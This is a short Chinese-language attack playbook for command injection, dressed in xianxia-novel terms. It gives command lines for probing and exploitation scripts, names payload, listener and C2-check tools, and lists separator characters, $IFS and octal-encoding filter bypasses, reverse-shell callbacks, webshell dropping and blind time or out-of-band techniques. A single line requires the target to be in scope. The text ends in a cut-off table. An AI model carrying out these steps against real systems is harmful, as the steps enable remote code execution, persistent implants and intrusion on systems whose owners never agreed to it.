# 大爱仙尊命令注入作业手法

> 杀招：`奴道驱使`  
> 工具：`python3 炼蛊房/tpl_inject_probe.py cmdi`  
> 打穿：`python3 炼蛊房/rce_forge.py shoot --family cmdi-unix`  
> 马/回连：`payload_forge.py` · `se_listen.py` · `host_c2_verify.py`

目标须在 scope。探测用回显标记 `se9359`，**不要一上来 `;id`**（日志吵、WAF 爱拦）。

---

## 1. 立刻跑

```bash
python3 炼蛊房/tpl_inject_probe.py cmdi --url 'https://授权/?host=1' --param host --case <案>
python3 炼蛊房/tpl_inject_probe.py cmdi --url 'https://授权/?host=1' --param host --exec --case <案>
```

产物：`案卷/tpl_inject/cmdi.json`。

---

## 2. 四刀

1. **找拼接** — ping / 诊断 / 转换 / 导出 / 文件名进 shell  
2. **分隔** — `;` `|` `&` `` ` `` `$()` `%0a`；空格被滤用 `$IFS`  
3. **过闸** — 关键字被滤用拼接、通配、`$'\151\144'`（id）  
4. **落地** — `--exec` 或 `rce_forge shoot` 出 `uid=`；`--rev` 回连 / `--write-ops` 落马。无回显用时间或 OOB

SSTI / 反序列化 / 表达式注入不是本卡：模板走 SSTI，Java 走 Shiro/Fastjson/SpEL。

---

| 档 | 成立 |
